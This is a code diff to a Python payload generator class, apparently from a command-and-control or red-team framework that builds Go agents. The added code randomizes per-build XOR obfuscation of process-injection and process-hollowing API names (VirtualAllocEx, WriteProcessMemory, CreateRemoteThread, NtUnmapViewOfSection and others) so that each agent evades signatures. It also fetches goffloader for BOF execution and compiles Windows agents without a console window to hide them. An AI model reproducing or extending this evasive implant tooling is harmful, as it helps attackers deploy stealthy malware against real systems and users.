@@ -458,6 +458,7 @@ class PayloadGenerator:
         import tempfile
         import shutil
         from datetime import datetime
+        import random
 
         # Create a polymorphic engine instance for Go agent
         poly = PolymorphicEngine()
@@ -556,6 +557,60 @@ class PayloadGenerator:
         template_path = os.path.join(os.path.dirname(__file__), 'go_agent_template.go')
         with open(template_path, 'r') as f:
             go_template = f.read()
+
+        # If obfuscation is enabled, randomize the XOR key to make each agent different
+        if obfuscate:
+            # Generate a random XOR key for string obfuscation
+            random_obfuscation_key = random.randint(1, 255)
+
+            # Find and replace the obfuscation key in the template
+            go_template = go_template.replace('obfuscationKey = byte(0x42)', f'obfuscationKey = byte({random_obfuscation_key})')
+
+            # Also make the obfuscated byte arrays random to make each agent unique
+            # This means each agent will have different obfuscated byte sequences
+            import re
+            import binascii
+
+            # Find all the obfuscated byte arrays and replace them with randomly generated ones
+            # that will still decrypt to the same original strings
+            def randomize_obfuscated_bytes(go_code_template, original_string, var_name):
+                # Generate a random key for this specific string
+                random_key = random.randint(1, 255)
+
+                # Create obfuscated bytes using the random key
+                obfuscated_bytes = []
+                for char in original_string:
+                    obfuscated_bytes.append(ord(char) ^ random_key)
+
+                # Format as Go byte array
+                byte_array_str = ', '.join([f'0x{b:02x}' for b in obfuscated_bytes])
+
+                # Replace the obfuscated byte array in the template
+                pattern = var_name + r' = \[\]byte\{[^\}]+\} // "' + original_string + r'"'
+                replacement = f'{var_name} = []byte{{{byte_array_str}}} // "{original_string}"'
+                return re.sub(pattern, replacement, go_code_template)
+
+            # Randomize the obfuscated DLL and API names
+            go_template = randomize_obfuscated_bytes(go_template, "kernel32.dll", "obfuscatedKernel32DLL")
+            go_template = randomize_obfuscated_bytes(go_template, "ntdll.dll", "obfuscatedNtdllDLL")
+            go_template = randomize_obfuscated_bytes(go_template, "user32.dll", "obfuscatedUser32DLL")
+            go_template = randomize_obfuscated_bytes(go_template, "OpenProcess", "obfuscatedOpenProcess")
+            go_template = randomize_obfuscated_bytes(go_template, "VirtualAllocEx", "obfuscatedVirtualAllocEx")
+            go_template = randomize_obfuscated_bytes(go_template, "WriteProcessMemory", "obfuscatedWriteProcessMemory")
+            go_template = randomize_obfuscated_bytes(go_template, "CreateRemoteThread", "obfuscatedCreateRemoteThread")
+            go_template = randomize_obfuscated_bytes(go_template, "VirtualProtectEx", "obfuscatedVirtualProtectEx")
+            go_template = randomize_obfuscated_bytes(go_template, "CreateToolhelp32Snapshot", "obfuscatedCreateToolhelp32Snapshot")
+            go_template = randomize_obfuscated_bytes(go_template, "Process32FirstW", "obfuscatedProcess32First")
+            go_template = randomize_obfuscated_bytes(go_template, "Process32NextW", "obfuscatedProcess32Next")
+            go_template = randomize_obfuscated_bytes(go_template, "CreateProcessW", "obfuscatedCreateProcess")
+            go_template = randomize_obfuscated_bytes(go_template, "ResumeThread", "obfuscatedResumeThread")
+            go_template = randomize_obfuscated_bytes(go_template, "SuspendThread", "obfuscatedSuspendThread")
+            go_template = randomize_obfuscated_bytes(go_template, "GetThreadContext", "obfuscatedGetThreadContext")
+            go_template = randomize_obfuscated_bytes(go_template, "SetThreadContext", "obfuscatedSetThreadContext")
+            go_template = randomize_obfuscated_bytes(go_template, "ReadProcessMemory", "obfuscatedReadProcessMemory")
+            go_template = randomize_obfuscated_bytes(go_template, "NtUnmapViewOfSection", "obfuscatedNtUnmapViewOfSection")
+            go_template = randomize_obfuscated_bytes(go_template, "GetConsoleWindow", "obfuscatedGetConsoleWindow")
+            go_template = randomize_obfuscated_bytes(go_template, "ShowWindow", "obfuscatedShowWindow")
 
         # Replace all placeholders with randomly generated names
         go_code = go_template.replace('{AGENT_STRUCT_NAME}', agent_struct_name)
@@ -733,7 +788,22 @@ class PayloadGenerator:
             ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
 
             if result.returncode != 0:
-                raise Exception(f"Failed to get Go dependencies: {result.stderr}")
+                raise Exception(f"Failed to get fernet-go dependency: {result.stderr}")
+
+            # Get goffloader dependencies for BOF execution
+            result = subprocess.run([
+                'go', 'get', 'github.com/praetorian-inc/goffloader/src/coff'
+            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
+
+            if result.returncode != 0:
+                raise Exception(f"Failed to get goffloader coff dependency: {result.stderr}")
+
+            result = subprocess.run([
+                'go', 'get', 'github.com/praetorian-inc/goffloader/src/lighthouse'
+            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
+
+            if result.returncode != 0:
+                raise Exception(f"Failed to get goffloader lighthouse dependency: {result.stderr}")
 
             if platform.lower() == 'linux':
                 output_filename = 'agent'
@@ -750,9 +820,14 @@ class PayloadGenerator:
                     env['GOOS'] = 'windows'
                 env['GOARCH'] = 'amd64'
 
+                # For Windows builds, use GUI application flag to prevent console window allocation
+                ldflags = ['-s', '-w']
+                if platform.lower() != 'linux':
+                    ldflags.extend(['-H', 'windowsgui'])  # Create GUI application without console window
+
                 result = subprocess.run([
                     'go', 'build',
-                    '-ldflags', '-s -w',
+                    '-ldflags', ' '.join(ldflags),
                     '-o', output_filename,
                     '.'
                 ], env=env, capture_output=True, text=True, cwd=temp_dir)
